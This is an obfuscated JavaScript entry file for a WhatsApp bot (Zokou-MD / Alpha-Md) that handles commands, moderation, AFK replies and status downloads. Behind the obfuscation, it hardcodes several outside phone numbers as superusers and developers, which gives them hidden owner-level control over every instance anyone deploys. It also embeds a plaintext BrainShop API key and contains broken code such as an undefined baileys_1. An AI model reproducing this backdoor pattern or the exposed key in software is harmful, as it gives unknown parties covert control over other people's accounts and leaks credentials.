const {
  makeWASocket,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  makeCacheableSignalKeyStore,
  DisconnectReason,
  makeInMemoryStore,
  getContentType,
  jidDecode,
  delay,
  downloadMediaMessage,
  downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const {
  Boom
} = require('@hapi/boom');
const {
  default: pino
} = require("pino");
const conf = require("./set");
const fs = require('fs-extra');
let evt = require("./framework/zokou");
const {
  reagir
} = require("./framework/app");
let path = require("path");
const FileType = require("file-type");
const {
  Sticker,
  StickerTypes
} = require("wa-sticker-formatter");
var session = conf.session.replace(/Zokou-MD-WHATSAPP-BOT;;;=>/g, '');
const NodeCache = require("node-cache");
const prefixe = conf.PREFIXE;
const {
  verifierEtatJid,
  recupererActionJid
} = require("./bdd/antilien");
const {
  atbverifierEtatJid,
  atbrecupererActionJid
} = require("./bdd/antibot");
const {
  isUserBanned,
  addUserToBanList,
  removeUserFromBanList
} = require("./bdd/banUser");
const {
  addGroupToBanList,
  isGroupBanned,
  removeGroupFromBanList
} = require("./bdd/banGroup");
const {
  isGroupOnlyAdmin,
  addGroupToOnlyAdminList,
  removeGroupFromOnlyAdminList
} = require('./bdd/onlyAdmin');
const {
  recupevents
} = require('./bdd/welcome');
const {
  isGroupspam
} = require('./bdd/antispam');
const {
  dbCache
} = require("./cache");
const plug = require("./bdd/plugin");
async function authentification() {
  const _0x523835 = function () {
    let _0x386b59 = true;
    return function (_0x5c98f2, _0x15654b) {
      const _0x3769e6 = _0x386b59 ? function () {
        if (_0x15654b) {
          const _0x13e23d = _0x15654b.apply(_0x5c98f2, arguments);
          _0x15654b = null;
          return _0x13e23d;
        }
      } : function () {};
      _0x386b59 = false;
      return _0x3769e6;
    };
  }();
  const _0x739a2c = _0x523835(this, function () {
    return _0x739a2c.toString().search("(((.+)+)+)+$").toString().constructor(_0x739a2c).search('(((.+)+)+)+$');
  });
  _0x739a2c();
  try {
    if (!fs.existsSync(__dirname + "/auth/creds.json") && session != "zokk") {
      console.log("connexion en cour ...");
      await fs.writeFileSync(__dirname + "/auth/creds.json", atob(session), "utf8");
    } else if (fs.existsSync(__dirname + "/auth/creds.json") && session != "zokk") {
      await fs.writeFileSync(__dirname + "/auth/creds.json", atob(session), "utf8");
    }
  } catch (_0x9b9a16) {
    console.log("Session Invalide " + _0x9b9a16);
    return;
  }
}
authentification();
const logger = pino({
  'level': "silent"
});
const msgCache = new NodeCache({
  'stdTTL': 0x14,
  'checkperiod': 0x78
});
const groupMetadataCache = new NodeCache({
  'stdTTL': 0x1770,
  'checkperiod': 0x1388
});
const CmdColdCache = new NodeCache({
  'stdTTL': 0x3c,
  'checkperiod': 0x3c
});
const store = makeInMemoryStore({
  'logger': logger
});
store.readFromFile('store.json');
setInterval(() => {
  store.writeToFile("store.json");
}, 0x2710);
async function connectToWhatsapp() {
  const {
    saveCreds: _0x3c0eb6,
    state: _0x3828fa
  } = await useMultiFileAuthState("./auth");
  const {
    version: _0x3a4064,
    isLatest: _0x32a391
  } = await fetchLatestBaileysVersion();
  const _0x2b16fe = makeWASocket({
    'version': _0x3a4064,
    'logger': logger,
    'browser': ["Zokou-md", "safari", "1.0.0"],
    'emitOwnEvents': true,
    'syncFullHistory': true,
    'printQRInTerminal': true,
    'markOnlineOnConnect': false,
    'msgRetryCounterCache': msgCache,
    'receivedPendingNotifications': true,
    'generateHighQualityLinkPreview': true,
    'auth': {
      'creds': _0x3828fa.creds,
      'keys': makeCacheableSignalKeyStore(_0x3828fa.keys, logger)
    },
    'keepAliveIntervalMs': 0x7530,
    'getMessage': async _0x278ddf => {
      if (store) {
        const _0x40cecb = await store.loadMessage(_0x278ddf.remoteJid, _0x278ddf.id);
        return _0x40cecb?.["message"] || undefined;
      }
    }
  });
  store?.["bind"](_0x2b16fe.ev);
  const _0x17bcb6 = new NodeCache({
    'stdTTL': 0x78,
    'checkperiod': 0xf0
  });
  _0x2b16fe.ev.on("messages.upsert", async _0x5d96b0 => {
    const {
      messages: _0x222516
    } = _0x5d96b0;
    const _0x4204b7 = _0x222516[0x0];
    if (!_0x4204b7.message) {
      return;
    }
    const _0x5e7b2c = _0x307ae7 => {
      if (!_0x307ae7) {
        return _0x307ae7;
      }
      if (/:\d+@/gi.test(_0x307ae7)) {
        let _0x1c281b = jidDecode(_0x307ae7) || {};
        return _0x1c281b.user && _0x1c281b.server && _0x1c281b.user + '@' + _0x1c281b.server || _0x307ae7;
      } else {
        return _0x307ae7;
      }
    };
    var _0x59c6eb = getContentType(_0x4204b7.message);
    var _0x392b78 = _0x59c6eb == "conversation" ? _0x4204b7.message.conversation : _0x59c6eb == "imageMessage" ? _0x4204b7.message.imageMessage?.["caption"] : _0x59c6eb == "videoMessage" ? _0x4204b7.message.videoMessage?.["caption"] : _0x59c6eb == "extendedTextMessage" ? _0x4204b7.message?.['extendedTextMessage']?.["text"] : _0x59c6eb == 'buttonsResponseMessage' ? _0x4204b7.message.buttonsResponseMessage?.["selectedButtonId"] : _0x59c6eb == 'listResponseMessage' ? _0x4204b7.message?.["listResponseMessage"]["singleSelectReply"]["selectedRowId"] : _0x59c6eb == "messageContextInfo" ? _0x4204b7.message?.["buttonsResponseMessage"]?.["selectedButtonId"] || _0x4204b7.message?.["listResponseMessage"]["singleSelectReply"]["selectedRowId"] || _0x4204b7.test : '';
    var _0x36d7be = _0x4204b7.key.remoteJid;
    var _0x46b079 = _0x5e7b2c(_0x2b16fe.user.id);
    var _0x3a25b6 = _0x46b079.split('@')[0x0];
    const _0x4fb3e2 = _0x36d7be?.["endsWith"]("@g.us");
    var _0x1540b4 = null;
    if (_0x4fb3e2) {
      if (groupMetadataCache.has(_0x36d7be)) {
        _0x1540b4 = groupMetadataCache.get(_0x36d7be);
      } else {
        metadata = await _0x2b16fe.groupMetadata(_0x36d7be);
        _0x1540b4 = metadata;
        groupMetadataCache.set(_0x36d7be, metadata);
      }
    }
    var _0x242d15 = _0x4fb3e2 ? _0x1540b4.subject : null;
    var _0x13636b = _0x4204b7.message?.["extendedTextMessage"]?.["contextInfo"]?.["quotedMessage"];
    var _0x3575aa = _0x5e7b2c(_0x4204b7.message?.['extendedTextMessage']?.['contextInfo']?.['participant']);
    var _0x27905a = _0x4fb3e2 ? _0x4204b7.key.participant ? _0x4204b7.key.participant : _0x4204b7.participant : _0x36d7be;
    if (_0x4204b7.key.fromMe) {
      _0x27905a = _0x46b079;
    }
    var _0x1f4e44 = _0x4fb3e2 ? _0x4204b7.key.participant : null;
    const {
      getAllSudoNumbers: _0x1f6eec
    } = require("./bdd/sudo");
    const _0x300c83 = _0x4204b7.pushName;
    let _0x48f576;
    if (dbCache.has("sudo")) {
      console.log("fetching from cache");
      _0x48f576 = dbCache.get("sudo");
    } else {
      console.log("fetching from database");
      _0x48f576 = await _0x1f6eec();
      dbCache.set("sudo", _0x48f576);
    }
    const _0x4e6c19 = [_0x3a25b6, "254748387615", "254796299159", '254752925938', '‪254743995989', "254110190196", conf.NUMERO_OWNER].map(_0x2c1a82 => _0x2c1a82.replace(/[^0-9]/g) + '@s.whatsapp.net');
    const _0x2ee6b7 = [..._0x48f576, ..._0x4e6c19];
    const _0x164572 = _0x2ee6b7.includes(_0x27905a);
    var _0xe2a290 = ["254748387615", "254796299159", '254752925938', '‪254110190196', "254743995989"].map(_0x14229b => _0x14229b.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x27905a);
    function _0x1757e4(_0x322ed6) {
      _0x2b16fe.sendMessage(_0x36d7be, {
        'text': _0x322ed6
      }, {
        'quoted': _0x4204b7
      });
    }
    console.log("\t [][]...{Alpha-Md}...[][]");
    console.log("=========== Nouveau message ===========");
    if (_0x4fb3e2) {
      console.log("message provenant du groupe : " + _0x242d15);
    }
    console.log("message envoyé par : [" + _0x300c83 + " : " + _0x27905a.split("@s.whatsapp.net")[0x0] + " ]");
    console.log("type de message : " + _0x59c6eb);
    console.log("------ contenu du message ------");
    console.log(_0x392b78);
    function _0x1012d0(_0x3a39dd) {
      let _0x16b0eb = [];
      for (_0x5d96b0 of _0x3a39dd) {
        if (_0x5d96b0.admin == null) {
          continue;
        }
        _0x16b0eb.push(_0x5d96b0.id);
      }
      return _0x16b0eb;
    }
    const _0x11c498 = _0x4fb3e2 ? await _0x1540b4.participants : '';
    let _0x8be184 = _0x4fb3e2 ? _0x1012d0(_0x11c498) : '';
    const _0x455f1f = _0x4fb3e2 ? _0x8be184.includes(_0x27905a) : false;
    var _0x1ae3f8 = _0x4fb3e2 ? _0x8be184.includes(_0x46b079) : false;
    var _0x579c5e = conf.ETAT;
    if (_0x579c5e == 0x1) {
      await _0x2b16fe.sendPresenceUpdate("available", _0x36d7be);
    } else {
      if (_0x579c5e == 0x2) {
        await _0x2b16fe.sendPresenceUpdate("composing", _0x36d7be);
      } else {
        if (_0x579c5e == 0x3) {
          await _0x2b16fe.sendPresenceUpdate("recording", _0x36d7be);
        } else {}
      }
    }
    let _0xe9f30b = _0x392b78 ? _0x392b78.trim().split(/ +/).slice(0x1) : null;
    let _0x3b4a54 = _0x392b78 ? _0x392b78.startsWith(prefixe) : false;
    let _0x485ffd = _0x3b4a54 ? _0x392b78.slice(0x1).trim().split(/ +/).shift().toLowerCase() : false;
    const _0x4aee26 = conf.URL.split(',');
    function _0x1703f0() {
      const _0x818291 = Math.floor(Math.random() * _0x4aee26.length);
      const _0x72853d = _0x4aee26[_0x818291];
      return _0x72853d;
    }
    var _0xc148d5 = {
      'superUser': _0x164572,
      'dev': _0xe2a290,
      'verifGroupe': _0x4fb3e2,
      'mbre': _0x11c498,
      'membreGroupe': _0x1f4e44,
      'verifAdmin': _0x455f1f,
      'infosGroupe': _0x1540b4,
      'nomGroupe': _0x242d15,
      'auteurMessage': _0x27905a,
      'nomAuteurMessage': _0x300c83,
      'idBot': _0x46b079,
      'verifZokouAdmin': _0x1ae3f8,
      'prefixe': prefixe,
      'arg': _0xe9f30b,
      'repondre': _0x1757e4,
      'mtype': _0x59c6eb,
      'groupeAdmin': _0x1012d0,
      'msgRepondu': _0x13636b,
      'auteurMsgRepondu': _0x3575aa,
      'ms': _0x4204b7,
      'mybotpic': _0x1703f0
    };
    if (_0x27905a.endsWith("s.whatsapp.net")) {
      const {
        ajouterOuMettreAJourUserData: _0x25ba7a
      } = require("./bdd/level");
      try {
        await _0x25ba7a(_0x27905a);
      } catch (_0x3cc4a3) {
        console.error(_0x3cc4a3);
      }
    }
    if (_0x4204b7.message?.['stickerMessage']) {
      const _0x1c1bd5 = require("./bdd/stickcmd");
      let _0x541414 = _0x4204b7.message.stickerMessage.mediaKey.join(',');
      let _0xbaf964 = await _0x1c1bd5.inStickCmd(_0x541414);
      if (_0xbaf964) {
        _0x392b78 = prefixe + (await _0x1c1bd5.getCmdById(_0x541414));
        _0xe9f30b = _0x392b78 ? _0x392b78.trim().split(/ +/).slice(0x1) : null;
        _0x3b4a54 = _0x392b78 ? _0x392b78.startsWith(prefixe) : false;
        _0x485ffd = _0x3b4a54 ? _0x392b78.slice(0x1).trim().split(/ +/).shift().toLowerCase() : false;
        _0x13636b = _0x4204b7.message.stickerMessage?.["contextInfo"]?.["quotedMessage"];
        _0x3575aa = _0x5e7b2c(_0x4204b7.message?.["stickerMessage"]?.["contextInfo"]?.["participant"]);
        _0xc148d5 = {
          'superUser': _0x164572,
          'dev': _0xe2a290,
          'verifGroupe': _0x4fb3e2,
          'mbre': _0x11c498,
          'membreGroupe': _0x1f4e44,
          'verifAdmin': _0x455f1f,
          'infosGroupe': _0x1540b4,
          'nomGroupe': _0x242d15,
          'auteurMessage': _0x27905a,
          'nomAuteurMessage': _0x300c83,
          'idBot': _0x46b079,
          'verifZokouAdmin': _0x1ae3f8,
          'prefixe': prefixe,
          'arg': _0xe9f30b,
          'repondre': _0x1757e4,
          'mtype': _0x59c6eb,
          'groupeAdmin': _0x1012d0,
          'msgRepondu': _0x13636b,
          'auteurMsgRepondu': _0x3575aa,
          'ms': _0x4204b7,
          'mybotpic': _0x1703f0
        };
      }
    }
    if (_0x3b4a54) {
      const _0xd58bc6 = evt.cm.find(_0x55ad12 => _0x55ad12.nomCom === _0x485ffd || _0x55ad12.alias.includes(_0x485ffd));
      if (_0xd58bc6) {
        let _0x208652;
        if (dbCache.has("bangroup")) {
          _0x208652 = dbCache.get("bangroup").includes(_0x36d7be);
        } else {
          let _0x2a225a = await isGroupBanned();
          _0x208652 = _0x2a225a.includes(_0x36d7be);
          dbCache.set("bangroup", _0x2a225a);
        }
        let _0x38c07d;
        if (dbCache.has("onlyadmin")) {
          _0x38c07d = dbCache.get("onlyadmin").includes(_0x36d7be);
        } else {
          let _0x1b7597 = await isGroupOnlyAdmin();
          _0x38c07d = _0x1b7597.includes(_0x36d7be);
          dbCache.set("onlyadmin", _0x1b7597);
        }
        let _0x326d99;
        if (dbCache.has("banuser")) {
          _0x326d99 = dbCache.get("banuser").includes(_0x27905a);
        } else {
          let _0x2d3a2a = await isUserBanned();
          _0x326d99 = _0x2d3a2a.includes(_0x27905a);
          dbCache.set("banuser", _0x2d3a2a);
        }
        if (conf.MODE.toLocaleLowerCase() != "yes" && !_0x164572) {
          console.log("bot is not public");
        } else {
          if (!_0xe2a290 && _0x36d7be == "120363158701337904@g.us") {
            console.log("refused");
          } else {
            if (!_0x164572 && _0x36d7be === _0x27905a && conf.PM_PERMIT === "yes") {
              console.log("pm permit on");
            } else {
              if (_0x4fb3e2 && !_0x164572 && _0x208652) {
                console.log("Banned group");
              } else {
                if ((!_0x164572 || !_0x455f1f) && _0x4fb3e2 && _0x38c07d) {
                  console.log("Permission denided");
                } else {
                  if (!_0x164572 && _0x326d99) {
                    _0x1757e4("You are banned from bot commands");
                  } else {
                    if (!_0x164572 && conf.ANTI_CMD_SPAM.toLowerCase() == "yes" && CmdColdCache.has(_0x27905a)) {
                      _0x1757e4("You are on cooldown, please wait " + Math.round((CmdColdCache.getTtl(_0x27905a) - Date.now()) / 0x3e8) + " seconds before using the bot again");
                    } else {
                      if (!_0x164572 && conf.ANTI_CMD_SPAM.toLowerCase() == "yes") {
                        CmdColdCache.set(_0x27905a, true);
                      }
                      try {
                        reagir(_0x36d7be, _0x2b16fe, _0x4204b7, _0xd58bc6.reaction);
                        _0xd58bc6.fonction(_0x36d7be, _0x2b16fe, _0xc148d5);
                      } catch (_0x5edd1e) {
                        console.log("😡😡 " + _0x5edd1e);
                        _0x2b16fe.sendMessage(_0x36d7be, {
                          'text': "😡😡 " + _0x5edd1e
                        }, {
                          'quoted': _0x4204b7
                        });
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    ;
    if (_0x4204b7.key && _0x4204b7.key.remoteJid === "status@broadcast" && conf.AUTO_READ_STATUS.toLocaleLowerCase() === "yes") {
      await _0x2b16fe.readMessages([_0x4204b7.key])["catch"](_0x4f1999 => console.log(_0x4f1999));
    }
    if (_0x4204b7.key && _0x4204b7.key.remoteJid === 'status@broadcast' && conf.AUTO_DOWNLOAD_STATUS.toLocaleLowerCase() === "yes") {
      try {
        if (_0x4204b7.message.extendedTextMessage) {
          var _0x1a4aa4 = _0x4204b7.message.extendedTextMessage.text;
          await _0x2b16fe.sendMessage(_0x46b079, {
            'text': _0x1a4aa4
          }, {
            'quoted': _0x4204b7
          });
        } else {
          if (_0x4204b7.message.imageMessage) {
            var _0x3f1d61 = _0x4204b7.message.imageMessage.caption;
            var _0x1d2582 = await _0x2b16fe.downloadAndSaveMediaMessage(_0x4204b7.message.imageMessage);
            await _0x2b16fe.sendMessage(_0x46b079, {
              'image': {
                'url': _0x1d2582
              },
              'caption': _0x3f1d61
            }, {
              'quoted': _0x4204b7
            });
          } else {
            if (_0x4204b7.message.videoMessage) {
              var _0x3f1d61 = _0x4204b7.message.videoMessage.caption;
              var _0x2be9bf = await _0x2b16fe.downloadAndSaveMediaMessage(_0x4204b7.message.videoMessage);
              await _0x2b16fe.sendMessage(_0x46b079, {
                'video': {
                  'url': _0x2be9bf
                },
                'caption': _0x3f1d61
              }, {
                'quoted': _0x4204b7
              });
            } else {
              if (_0x4204b7.message.audioMessage) {
                var _0x20c34c = await _0x2b16fe.downloadAndSaveMediaMessage(_0x4204b7.message.audioMessage);
                await _0x2b16fe.sendMessage(_0x46b079, {
                  'audio': {
                    'url': _0x20c34c
                  },
                  'mimetype': 'audio/mp4'
                }, {
                  'quoted': _0x4204b7
                });
              }
            }
          }
        }
      } catch (_0x496b02) {
        console.error(_0x496b02);
      }
    }
    if ((_0x392b78.toLowerCase().includes("https://") || _0x392b78.toLowerCase().includes("http://")) && _0x4fb3e2) {
      console.log("lien detecté");
      const _0x6c09ed = await verifierEtatJid(_0x36d7be);
      if (_0x6c09ed) {
        if (!_0x1ae3f8) {
          _0x1757e4("link detected, I need administrator rights to delete");
        } else {
          if (_0x164572 || _0x455f1f) {
            console.log("autority send link");
          } else {
            const _0x360f3b = {
              'remoteJid': _0x36d7be,
              'fromMe': false,
              'id': _0x4204b7.key.id,
              'participant': _0x27905a
            };
            var _0x59c111 = "link detected, \n";
            var _0x3d45a4 = await recupererActionJid(_0x36d7be);
            if (_0x3d45a4 === "remove") {
              var _0x3295f3 = new Sticker('https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif', {
                'pack': "Alpha-Md",
                'author': conf.NOM_OWNER,
                'type': StickerTypes.FULL,
                'categories': ['🤩', '🎉'],
                'id': "12345",
                'quality': 0x32,
                'background': "#000000"
              });
              await _0x3295f3.toFile('st1.webp');
              _0x59c111 += "message deleted \n @" + _0x27905a.split('@')[0x0] + " removed from group.";
              await _0x2b16fe.sendMessage(_0x36d7be, {
                'sticker': fs.readFileSync("st1.webp")
              }, {
                'quoted': _0x4204b7
              });
              0x0;
              baileys_1.delay(0x320);
              await _0x2b16fe.sendMessage(_0x36d7be, {
                'text': _0x59c111,
                'mentions': [_0x27905a]
              }, {
                'quoted': _0x4204b7
              });
              try {
                await _0x2b16fe.groupParticipantsUpdate(_0x36d7be, [_0x27905a], 'remove');
              } catch (_0x1d100c) {
                console.log("antiien " + _0x1d100c);
              }
              await _0x2b16fe.sendMessage(_0x36d7be, {
                'delete': _0x360f3b
              });
              await fs.unlink("st1.webp");
            } else {
              if (_0x3d45a4 === "delete") {
                _0x59c111 += "message deleted \n @" + _0x27905a.split('@')[0x0] + " Please avoid sending links.";
                await _0x2b16fe.sendMessage(_0x36d7be, {
                  'text': _0x59c111,
                  'mentions': [_0x27905a]
                }, {
                  'quoted': _0x4204b7
                });
                await _0x2b16fe.sendMessage(_0x36d7be, {
                  'delete': _0x360f3b
                });
              } else {
                if (_0x3d45a4 === "warn") {
                  const {
                    getWarnCountByJID: _0x569ea1,
                    ajouterUtilisateurAvecWarnCount: _0xc2d0c3
                  } = require('./bdd/warn');
                  let _0x15a790 = await _0x569ea1(_0x27905a);
                  let _0x3027c0 = conf.WARN_COUNT;
                  if (_0x15a790 >= _0x3027c0) {
                    var _0x3295f3 = new Sticker("https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif", {
                      'pack': "Alpha-Md",
                      'author': conf.NOM_OWNER,
                      'type': StickerTypes.FULL,
                      'categories': ['🤩', '🎉'],
                      'id': '12345',
                      'quality': 0x32,
                      'background': "#000000"
                    });
                    await _0x3295f3.toFile("st1.webp");
                    var _0x2cde94 = "Link detected; you have reached the maximum number of warnings therefore you will be removed from the group";
                    await _0x2b16fe.sendMessage(_0x36d7be, {
                      'sticker': fs.readFileSync('st1.webp')
                    }, {
                      'quoted': _0x4204b7
                    });
                    await _0x2b16fe.sendMessage(_0x36d7be, {
                      'text': _0x2cde94,
                      'mentions': [_0x27905a]
                    }, {
                      'quoted': _0x4204b7
                    });
                    await _0x2b16fe.groupParticipantsUpdate(_0x36d7be, [_0x27905a], "remove");
                    await _0x2b16fe.sendMessage(_0x36d7be, {
                      'delete': _0x360f3b
                    });
                    await fs.unlink("st1.webp");
                  } else {
                    var _0x4ebe52 = _0x3027c0 - (_0x15a790 + 0x1);
                    var _0x5d097b = _0x4ebe52 != 0x0 ? "Link detected;\npass " + _0x4ebe52 + " warning(s) again and you will be kicked out of the group" : "Lien detecté ;\nLink detected ;\n Next time will be the right one";
                    await _0xc2d0c3(_0x27905a);
                    await _0x2b16fe.sendMessage(_0x36d7be, {
                      'text': _0x5d097b,
                      'mentions': [_0x27905a]
                    }, {
                      'quoted': _0x4204b7
                    });
                    await _0x2b16fe.sendMessage(_0x36d7be, {
                      'delete': _0x360f3b
                    });
                  }
                }
              }
            }
          }
        }
      }
      ;
    }
    const _0x1be713 = _0x4204b7.key?.['id']?.['startsWith']("BAES") && _0x4204b7.key?.['id']?.["length"] === 0x10;
    const _0x2240a6 = _0x4204b7.key?.['id']?.['startsWith']("BAE5") && _0x4204b7.key?.['id']?.["length"] === 0x10;
    const _0x395ec9 = _0x4204b7.key?.['id']?.["startsWith"]("3EB0") && _0x4204b7.key?.['id']?.["length"] >= 0xc;
    if (_0x1be713 || _0x2240a6 || _0x395ec9) {
      const _0x2302b6 = await atbverifierEtatJid(_0x36d7be);
      if (_0x2302b6) {
        if (_0x59c6eb === 'reactionMessage') {
          console.log("Je ne reagis pas au reactions");
        } else {
          if (_0x455f1f || _0x27905a === _0x46b079 || _0x164572) {
            console.log("je fais rien");
          } else {
            if (!_0x1ae3f8) {
              _0x1757e4("J'ai besoin des droits d'administrations pour agire");
            } else {
              const _0x227c50 = {
                'remoteJid': _0x36d7be,
                'fromMe': false,
                'id': _0x4204b7.key.id,
                'participant': _0x27905a
              };
              var _0x59c111 = "bot détecté, \n";
              var _0x3d45a4 = await atbrecupererActionJid(_0x36d7be);
              if (_0x3d45a4 === "remove") {
                try {
                  var _0x3295f3 = new Sticker("https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif", {
                    'pack': 'Alpha-Md',
                    'author': conf.NOM_OWNER,
                    'type': StickerTypes.FULL,
                    'categories': ['🤩', '🎉'],
                    'id': "12345",
                    'quality': 0x32,
                    'background': "#000000"
                  });
                  await _0x3295f3.toFile("st1.webp");
                  _0x59c111 += "deleted message \n @" + _0x27905a.split('@')[0x0] + " removed from the group.";
                  await _0x2b16fe.sendMessage(_0x36d7be, {
                    'sticker': fs.readFileSync('st1.webp')
                  }, {
                    'quoted': _0x4204b7
                  });
                  0x0;
                  baileys_1.delay(0x320);
                  await _0x2b16fe.sendMessage(_0x36d7be, {
                    'text': _0x59c111,
                    'mentions': [_0x27905a]
                  }, {
                    'quoted': _0x4204b7
                  });
                  await _0x2b16fe.groupParticipantsUpdate(_0x36d7be, [_0x27905a], "remove");
                  await _0x2b16fe.sendMessage(_0x36d7be, {
                    'delete': _0x227c50
                  });
                  await fs.unlink("st1.webp");
                } catch (_0xd7d8af) {
                  console.log("antibot " + _0xd7d8af);
                }
              } else {
                if (_0x3d45a4 === "delete") {
                  _0x59c111 += "deleted message \n @" + _0x27905a.split('@')[0x0] + " please avoid using bots.";
                  await _0x2b16fe.sendMessage(_0x36d7be, {
                    'text': _0x59c111,
                    'mentions': [_0x27905a]
                  }, {
                    'quoted': _0x4204b7
                  });
                  await _0x2b16fe.sendMessage(_0x36d7be, {
                    'delete': _0x227c50
                  });
                } else {
                  if (_0x3d45a4 === "warn") {
                    const {
                      getWarnCountByJID: _0x4adef6,
                      ajouterUtilisateurAvecWarnCount: _0x1aee26
                    } = require("./bdd/warn");
                    let _0x17839b = await _0x4adef6(_0x27905a);
                    let _0x46fe72 = conf.WARN_COUNT;
                    if (_0x17839b >= _0x46fe72) {
                      var _0x3295f3 = new Sticker("https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif", {
                        'pack': "Alpha-Md",
                        'author': conf.NOM_OWNER,
                        'type': StickerTypes.FULL,
                        'categories': ['🤩', '🎉'],
                        'id': "12345",
                        'quality': 0x32,
                        'background': "#000000"
                      });
                      await _0x3295f3.toFile('st1.webp');
                      var _0x2cde94 = "bot detected; you have reached the maximum number of warnings therefore you will be removed from the group";
                      await _0x2b16fe.sendMessage(_0x36d7be, {
                        'sticker': fs.readFileSync("st1.webp")
                      }, {
                        'quoted': _0x4204b7
                      });
                      await _0x2b16fe.sendMessage(_0x36d7be, {
                        'text': _0x2cde94,
                        'mentions': [_0x27905a]
                      }, {
                        'quoted': _0x4204b7
                      });
                      await _0x2b16fe.groupParticipantsUpdate(_0x36d7be, [_0x27905a], "remove");
                      await _0x2b16fe.sendMessage(_0x36d7be, {
                        'delete': _0x227c50
                      });
                      await fs.unlink("st1.webp");
                    } else {
                      var _0x4ebe52 = _0x46fe72 - (_0x17839b + 0x1);
                      var _0x5d097b = _0x4ebe52 != 0x0 ? "bot detected;\n pass another " + _0x4ebe52 + " warning(s) and you will be kicked out of the group" : "bot detected;\n The next one will be the right one";
                      await _0x1aee26(_0x27905a);
                      await _0x2b16fe.sendMessage(_0x36d7be, {
                        'text': _0x5d097b,
                        'mentions': [_0x27905a]
                      }, {
                        'quoted': _0x4204b7
                      });
                      await _0x2b16fe.sendMessage(_0x36d7be, {
                        'delete': _0x227c50
                      });
                    }
                  }
                }
              }
            }
          }
        }
      }
      ;
    }
    const _0x308f47 = require("./bdd/afk");
    let _0x18aced = await _0x308f47.getAfkById(0x1);
    if (_0x18aced?.['etat'] == 'on' && _0x4204b7.key?.['fromMe']) {
      const _0x4d2418 = _0x4204b7.key?.['id']?.["startsWith"]("BAES") && _0x4204b7.key?.['id']?.["length"] === 0x10;
      const _0x530fcb = _0x4204b7.key?.['id']?.["startsWith"]("BAE5") && _0x4204b7.key?.['id']?.["length"] === 0x10;
      const _0x3371cd = _0x4204b7.key?.['id']?.["startsWith"]('3EB0') && _0x4204b7.key?.['id']?.["length"] >= 0xc;
      if (!_0x4d2418 && !_0x530fcb && !_0x3371cd) {
        console.log("desactivation de l'afk");
        if (_0x392b78.toLocaleLowerCase() == "noafk") {
          await _0x308f47.changeAfkState(0x1, "off");
          _0x1757e4("Afk deactivate!");
        } else {
          _0x1757e4("Send *noafk* if you want to disable afk");
        }
      }
    }
    if (_0x4204b7.message[_0x59c6eb]?.['contextInfo']?.["mentionedJid"]?.["includes"](_0x46b079) && _0x4fb3e2) {
      console.log("Je suis mentionner");
      if (_0x18aced?.['etat'] == 'on') {
        const _0x7eae5d = _0x4204b7.key?.['id']?.["startsWith"]("BAES") && _0x4204b7.key?.['id']?.["length"] === 0x10;
        const _0x306d2e = _0x4204b7.key?.['id']?.["startsWith"]('BAE5') && _0x4204b7.key?.['id']?.["length"] === 0x10;
        const _0x34fdc0 = _0x4204b7.key?.['id']?.["startsWith"]("3EB0") && _0x4204b7.key?.['id']?.["length"] >= 0xc;
        if (_0x7eae5d || _0x306d2e || _0x34fdc0) {
          console.log("Message de bot");
        } else {
          if (_0x4204b7.key?.["fromMe"]) {
            console.log("Message venant de moi");
          } else if (_0x18aced.lien == "no url") {
            _0x1757e4(_0x18aced.message);
          } else {
            _0x2b16fe.sendMessage(_0x36d7be, {
              'image': {
                'url': _0x18aced.lien
              },
              'caption': _0x18aced.message
            }, {
              'caption': _0x4204b7
            });
          }
        }
      } else {
        if (_0x36d7be !== "120363158701337904@g.us" && _0x27905a !== _0x46b079) {
          let _0x44517b = require("./bdd/mention");
          let _0x368243 = await _0x44517b.recupererToutesLesValeurs();
          let _0x3ede31 = _0x368243[0x0];
          if (_0x3ede31.status === "non") {
            console.log("mention pas actifs");
          } else {
            let _0x4dcf61;
            if (_0x3ede31.type.toLocaleLowerCase() === 'image') {
              _0x4dcf61 = {
                'image': {
                  'url': _0x3ede31.url
                },
                'caption': _0x3ede31.message
              };
            } else {
              if (_0x3ede31.type.toLocaleLowerCase() === "video") {
                _0x4dcf61 = {
                  'video': {
                    'url': _0x3ede31.url
                  },
                  'caption': _0x3ede31.message
                };
              } else {
                if (_0x3ede31.type.toLocaleLowerCase() === "sticker") {
                  let _0x4afe1f = new Sticker(_0x3ede31.url, {
                    'pack': conf.NOM_OWNER,
                    'type': StickerTypes.FULL,
                    'categories': ['🤩', '🎉'],
                    'id': '12345',
                    'quality': 0x46,
                    'background': "transparent"
                  });
                  const _0x2e7793 = await _0x4afe1f.toBuffer();
                  _0x4dcf61 = {
                    'sticker': _0x2e7793
                  };
                } else if (_0x3ede31.type.toLocaleLowerCase() === "audio") {
                  _0x4dcf61 = {
                    'audio': {
                      'url': _0x3ede31.url
                    },
                    'mimetype': 'audio/mp4'
                  };
                }
              }
            }
            _0x2b16fe.sendMessage(_0x36d7be, _0x4dcf61, {
              'quoted': _0x4204b7
            })['catch'](_0x232141 => console.error(_0x232141));
          }
        }
        ;
      }
    }
    if (_0x36d7be.endsWith("@s.whatsapp.net") && _0x27905a != _0x46b079) {
      if (_0x18aced?.["etat"] == 'on') {
        if (_0x18aced.lien == "no url") {
          _0x1757e4(_0x18aced.message);
        } else {
          _0x2b16fe.sendMessage(_0x36d7be, {
            'image': {
              'url': _0x18aced.lien
            },
            'caption': _0x18aced.message
          }, {
            'caption': _0x4204b7
          });
        }
      } else {
        if (conf.CHATBOT === "oui") {
          if (_0x3b4a54) {
            const _0x7d811e = require("./framework/traduction");
            let _0x4fb209 = await _0x7d811e(_0x392b78, {
              'to': 'en'
            });
            fetch("http://api.brainshop.ai/get?bid=177607&key=NwzhALqeO1kubFVD&uid=[uid]&msg=" + _0x4fb209).then(_0x33a43c => _0x33a43c.json()).then(_0x422631 => {
              const _0x5dc038 = _0x422631.cnt;
              _0x1757e4(_0x5dc038);
            })["catch"](_0x2d4f93 => {
              console.error("Erreur lors de la requête à BrainShop :", _0x2d4f93);
            });
          }
        }
      }
    }
